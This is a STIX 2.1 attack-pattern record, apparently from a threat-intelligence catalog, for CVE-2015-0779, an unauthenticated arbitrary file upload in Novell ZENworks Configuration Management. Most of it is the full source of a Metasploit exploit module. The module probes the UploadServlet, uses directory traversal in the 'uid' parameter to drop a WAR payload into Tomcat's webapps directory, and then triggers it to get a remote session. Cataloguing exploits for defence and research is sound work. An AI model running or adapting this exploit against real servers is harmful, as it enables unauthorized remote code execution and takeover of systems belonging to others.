{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5bb88cdd-aa6b-4f4e-9437-95be407edcad",
    "created": "2024-08-14T17:09:35.761662Z",
    "modified": "2024-08-14T17:09:35.761666Z",
    "name": "Novell ZENworks Configuration Management Arbitrary File Upload",
    "description": " This module exploits a file upload vulnerability in Novell ZENworks Configuration Management (ZCM, which is part of the ZENworks Suite). The vulnerability exists in the UploadServlet which accepts unauthenticated file uploads and does not check the \"uid\" parameter for directory traversal characters. This allows an attacker to write anywhere in the file system, and can be abused to deploy a WAR file in the Tomcat webapps directory. ZCM up to (and including) 11.3.1 is vulnerable to this attack. This module has been tested successfully with ZCM 11.3.1 on Windows and Linux. Note that this is a similar vulnerability to ZDI-10-078 / OSVDB-63412 which also has a Metasploit exploit, but it abuses a different parameter of the same servlet. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/zenworks_configuration_management_upload.rb",
            "external_id": "zenworks_configuration_management_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0779"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Apr/21"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Novell ZENworks Configuration Management Arbitrary File Upload',\n      'Description' => %q{\n        This module exploits a file upload vulnerability in Novell ZENworks Configuration\n        Management (ZCM, which is part of the ZENworks Suite). The vulnerability exists in\n        the UploadServlet which accepts unauthenticated file uploads and does not check the\n        \"uid\" parameter for directory traversal characters. This allows an attacker to write\n        anywhere in the file system, and can be abused to deploy a WAR file in the Tomcat\n        webapps directory. ZCM up to (and including) 11.3.1 is vulnerable to this attack.\n        This module has been tested successfully with ZCM 11.3.1 on Windows and Linux. Note\n        that this is a similar vulnerability to ZDI-10-078 / OSVDB-63412 which also has a\n        Metasploit exploit, but it abuses a different parameter of the same servlet.\n      },\n      'Author'       =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2015-0779'],\n          ['OSVDB', '120382'],\n          ['URL', 'https://seclists.org/fulldisclosure/2015/Apr/21']\n        ],\n      'DefaultOptions' => { 'WfsDelay' => 30 },\n      'Privileged'  => true,\n      'Platform'    => 'java',\n      'Arch'        => ARCH_JAVA,\n      'Targets'     =>\n        [\n          [ 'Novell ZCM < v11.3.2 - Universal Java', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-04-07'))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL',\n          [true, 'Use SSL', true]),\n        OptString.new('TARGETURI',\n          [true, 'The base path to ZCM / ZENworks Suite', '/zenworks/']),\n        OptString.new('TOMCAT_PATH',\n          [false, 'The Tomcat webapps traversal path (from the temp directory)'])\n      ])\n  end\n\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], 'UploadServlet'),\n      'method' => 'GET'\n    })\n\n    if res && res.code == 200 && res.body.to_s =~ /ZENworks File Upload Servlet/\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n\n  def upload_war_and_exec(tomcat_path)\n    app_base = rand_text_alphanumeric(4 + rand(32 - 4))\n    war_payload = payload.encoded_war({ :app_name => app_base }).to_s\n\n    print_status(\"Uploading WAR file to #{tomcat_path}\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(datastore['TARGETURI'], 'UploadServlet'),\n      'method' => 'POST',\n      'data' => war_payload,\n      'ctype' => 'application/octet-stream',\n      'vars_get' => {\n        'uid' => tomcat_path,\n        'filename' => \"#{app_base}.war\"\n      }\n    })\n    if res && res.code == 200\n      print_good(\"Upload appears to have been successful\")\n    else\n      print_error(\"Failed to upload, try again with a different path?\")\n      return false\n    end\n\n    10.times do\n      Rex.sleep(2)\n\n      # Now make a request to trigger the newly deployed war\n      print_status(\"Attempting to launch payload in deployed WAR...\")\n      send_request_cgi({\n        'uri'    => normalize_uri(app_base, Rex::Text.rand_text_alpha(rand(8)+8)),\n        'method' => 'GET'\n      })\n\n      # Failure. The request timed out or the server went away.\n      break if res.nil?\n      # Failure. Unexpected answer\n      break if res.code != 200\n      # Unless session... keep looping\n      return true if session_created?\n    end\n\n    false\n  end\n\n\n  def exploit\n    tomcat_paths = []\n    if datastore['TOMCAT_PATH']\n      tomcat_paths << datastore['TOMCAT_PATH']\n    end\n    tomcat_paths.concat(['../../../opt/novell/zenworks/share/tomcat/webapps/', '../webapps/'])\n\n    tomcat_paths.each do |tomcat_path|\n      break if upload_war_and_exec(tomcat_path)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-04-07",
    "x_mitre_platforms": [
        "java'"
    ]
}